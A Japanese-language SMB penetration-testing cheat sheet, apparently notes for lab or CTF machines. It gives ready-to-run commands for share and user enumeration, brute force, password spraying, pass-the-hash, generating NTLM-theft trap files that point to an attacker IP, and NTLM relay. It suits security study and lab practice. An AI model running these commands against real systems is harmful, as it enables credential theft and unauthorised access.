# SMB

## 列挙

```shell
# -U ユーザーリストを取得
# -M マシンリストを取得
# -N ネームリストダンプを取得 (-U および -M とは異なります)
# -S シェアリストを取得
# -P パスワードポリシー情報を取得
# -G グループとメンバーリストを取得
# -a 上記のすべて（完全な基本列挙）
enum4linux -S $TARGET

# -R RID
enum4linux -R 1000-1003 $TARGET
```

```sh
# 無名ログイン
smbclient -L \\$TARGET -U ""

# パスワードなしログイン
smbclient -L //$TARGET -N
```

## 接続

```shell
# バックスラッシュが正式だが、エスケープが面倒なので環境が許せばスラッシュの方が楽
smbclient //$TARGET/<share> -U <user>
```

### 再帰的にファイル取得

```shell
smbget -R smb://$TARGET/anonymous
```

smbclient のプロンプトでも可能。

```sh
recurse ON
prompt OFF
mget *
```

### 再帰的に表示

```sh
smbmap -u "user" -p "pass" -H $TARGET -r
```

## crackmapexec

### 共有フォルダ列挙

```sh
crackmapexec smb $TARGET -u guest -p '' --shares
```

### ユーザー列挙

```sh
crackmapexec smb $TARGET -u guest -p '' --rid-brute
```

### 接続可否の確認

```sh
crackmapexec smb windcorp.thm -u brittanycr -p 'thm1234#'
```

### ブルートフォース

ロックアウトポリシーの確認。LockoutThreshold が 0ならロックアウト無効。

```ps
Get-ADDefaultDomainPasswordPolicy
```

ユーザー固定

```sh
crackmapexec smb $TARGET -u <name> -p /usr/share/wordlists/fasttrack.txt
```

ユーザーとパスワードの組み合わせ

```sh
awk 'NR==FNR{u[i++]=$0; next} {for(j=0; j<i; j++) print u[j] ":" $0}' ./User.txt /usr/share/wordlists/fasttrack.txt > combo_list.txt

../tools/kerbrute bruteforce -d thm.local --dc $TARGET ./combo_list.txt
```

### ユーザー名とパスワードが同じパターン

```sh
crackmapexec smb $TARGET -u ./names.txt -p ./names.txt --no-bruteforce
```

### パスワードスプレー

SMBではないが使いどころが近いので。

```sh
../kerbrute passwordspray -d DOMAIN.thm --dc $TARGET users.txt 'password'
```

### NTLMハッシュリストをブルートフォース（例：ntds.dit から出力）

```sh
crackmapexec smb $TARGET -u users.txt -H ntlm-hashes.txt
```

## SMBトラップ

Responder で NTLMハッシュを入手するためのファイルを生成

```sh
git clone https://github.com/Greenwolf/ntlm_theft.git
cd ntlm_theft
python ./ntlm_theft.py --generate all --server 192.168.129.39 --filename project
```

```sh
$ ls ntlm_theft/project 
 Autorun.inf                    project.htm                     'project-(remotetemplate).docx'
 desktop.ini                   'project-(icon).url'              project.rtf
 project.application           'project-(includepicture).docx'   project.scf
 project.asx                    project.jnlp                    'project-(stylesheet).xml'
'project-(externalcell).xlsx'   project.library-ms               project.theme
'project-(frameset).docx'       project.lnk                     'project-(url).url'
'project-(fulldocx).xml'        project.m3u                      project.wax
'project-(handler).htm'         project.pdf                      zoom-attack-instructions.txt
```

### NTLMリレー

SMBにアクセスしてくるマシンと、リレー先のマシンは異なるマシンである必要がある。

```sh
impacket-ntlmrelayx -t $TARGET2 -smb2support -i
```
